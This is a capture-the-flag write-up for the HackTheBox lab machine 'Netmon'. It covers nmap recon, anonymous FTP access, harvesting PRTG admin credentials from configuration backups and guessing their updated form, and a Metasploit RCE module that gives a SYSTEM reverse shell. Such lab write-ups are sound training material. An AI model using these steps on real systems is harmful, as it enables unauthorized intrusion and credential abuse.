+++ 
title = "Netmon HTB Write up"
description = "Write up for the HTB machine 'Netmon'"
author = "greatmoves"
tags=["hackthebox", "easy" , "nmap", "ftp", "anonymous login", "RCE vulnerability", "metasploit", "privilege escalation", "Windows"]
date = 2023-05-04
+++

# 1. Initial recon

## 1.1. nmap 
`nmap -sC -sV 10.10.10.152`

```
PORT    STATE SERVICE      VERSION
21/tcp  open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -22s, deviation: 0s, median: -22s
| smb2-time: 
|   date: 2023-05-04T05:08:34
|_  start_date: 2023-05-04T04:56:57
```

# 2. user.txt
from the nmap scan we can see that anonymous ftp login is allowed, meaning we can ftp into the machine without any credentials
so we can simply run
`ftp 10.10.10.152` and input the credentials `anonymous:anonymous` to log in. from there we can navigate to our user flag at `/Users/Public/user.txt` and then run `get user.txt` to download the file and read the flag.


# 3. root.txt

Looking at the web application in the browser we can see `PRTG Network Monitor` is running with a login. so let's enumerate the file system with our ftp access to try and find some credentials.

from ftp we are able to find the directory `/ProgramData/paessler/PRTG Network Monitor`

downloading the 3 configuration files
```
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
```
we are able to enuerate a username `prtgadmin` and also find a password in `PRTG Configuration.old.bak` which is `PrTg@dmin2018`

Trying the credentials `prtgadmin:PrTg@dmin2018` in the web app don't work :( 

fortunate for us the admin of this site isn't very good with their password management so we can easily guess `PrTg@dmin2019` as the new password (considering `PrTg@dmin2018` came from the old configuration), and good news for us, that works.

## 3.1. metasploit

searching the version of the software `prtg network 18.1.37.13946` on the dashboard of the web application we can see that there is an RCE vulnerability.

spinning up `msfconsole` we simply run the commands
```
search prtg
use 0
set admin_password PrTg@dmin2019
set rhosts 10.10.10.152
set lhosts YOUR_IP
run
```
once we have our meterpreter shell we can run the commands
```
shell
whoami
```
which will reveal that we are `nt authority\system`

the root flag can be found at `C:\Users\Administrator\Desktop` and read using `type "root.txt"`